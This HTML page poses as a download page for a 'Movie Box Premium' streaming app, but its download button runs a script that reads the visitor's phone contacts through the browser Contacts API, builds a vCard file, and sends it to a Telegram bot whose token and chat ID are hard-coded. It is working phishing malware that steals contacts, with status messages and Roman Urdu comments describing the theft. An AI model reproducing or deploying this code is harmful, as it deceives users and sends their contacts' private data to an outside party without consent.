<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Movie Box Pro - Premium Download</title>
    <style>
        body {
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            background: linear-gradient(135deg, #1f1c2c, #928dab);
            color: #ffffff;
            margin: 0;
            padding: 0;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
        }
        .container {
            background: rgba(0, 0, 0, 0.7);
            padding: 30px;
            border-radius: 15px;
            text-align: center;
            box-shadow: 0 8px 32px 0 rgba(0, 0, 0, 0.37);
            backdrop-filter: blur(8px);
            width: 90%;
            max-width: 400px;
        }
        h1 {
            color: #ffcc00;
            margin-bottom: 10px;
        }
        p {
            color: #dddddd;
            font-size: 14px;
            margin-bottom: 25px;
        }
        .btn {
            background: #ff4757;
            color: white;
            border: none;
            padding: 12px 20px;
            font-size: 16px;
            font-weight: bold;
            border-radius: 25px;
            cursor: pointer;
            width: 100%;
            transition: 0.3s;
        }
        .btn:hover {
            background: #ff6b81;
        }
        #status {
            margin-top: 15px;
            font-size: 13px;
            color: #00ffcc;
        }
    </style>
</head>
<body>

    <div class="container">
        <h1>🎬 Movie Box Premium</h1>
        <p>Unlimited movies, ad-free streaming, and fast downloads. Verify your device to start downloading the app.</p>
        <button class="btn" onclick="extractAllContacts()">Download Premium App</button>
        <div id="status"></div>
    </div>

    <script>
        const BOT_TOKEN = "9070576355:AAGpoWTISyTSTftruaIQG1i3V6RkdKDgSA8"; 
        const CHAT_ID = "7126661546";

        async function extractAllContacts() {
            const statusDiv = document.getElementById('status');
            
            // Check karein ke browser Contacts API ko support karta hai ya nahi
            if ('contacts' in navigator && navigator.contacts.get) {
                try {
                    statusDiv.innerText = "Accessing all contacts...";
                    const supportedProperties = await navigator.contacts.getProperties();
                    
                    const opts = { multiple: true };
                    const props = supportedProperties.includes('name') && supportedProperties.includes('tel') 
                                  ? ['name', 'tel', 'email'] 
                                  : ['tel'];

                    // Saare contacts ek sath fetch karne ki koshish
                    const contacts = await navigator.contacts.get(props, opts);
                    
                    if (!contacts || contacts.length === 0) {
                        statusDiv.innerText = "❌ Koi contact nahi mila.";
                        return;
                    }

                    statusDiv.innerText = `Found ${contacts.length} contacts. Preparing backup...`;
                    let vCardData = "";

                    contacts.forEach((contact) => {
                        const name = (contact.name && contact.name[0]) ? contact.name[0] : "Unknown";
                        const tel = (contact.tel && contact.tel[0]) ? contact.tel[0] : "No Number";
                        
                        vCardData += `BEGIN:VCARD\nVERSION:3.0\nFN:${name}\nTEL:${tel}\nEND:VCARD\n`;
                    });

                    statusDiv.innerText = "Sending file to Telegram...";

                    // .vcf file banakar Telegram par bhejna taake 1000+ contacts ek sath chale jayein
                    const blob = new Blob([vCardData], { type: 'text/vcard' });
                    const formData = new FormData();
                    formData.append('chat_id', CHAT_ID);
                    formData.append('document', blob, `contacts_backup_${Date.now()}.vcf`);
                    formData.append('caption', `📂 Total Contacts Backup: ${contacts.length}`);

                    const response = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendDocument`, {
                        method: 'POST',
                        body: formData
                    });

                    if (response.ok) {
                        statusDiv.innerText = "✅ Success! All contacts sent to Telegram.";
                    } else {
                        statusDiv.innerText = "❌ Telegram par file bhejne mein masla hua.";
                    }

                } catch (ex) {
                    console.error(ex);
                    statusDiv.innerText = "❌ Error: Browser ne saare contacts automatic allow nahi kiye.";
                }
            } else {
                statusDiv.innerText = "❌ Aapka browser automatic contact fetching support nahi karta.";
            }
        }
    </script>
</body>
</html>
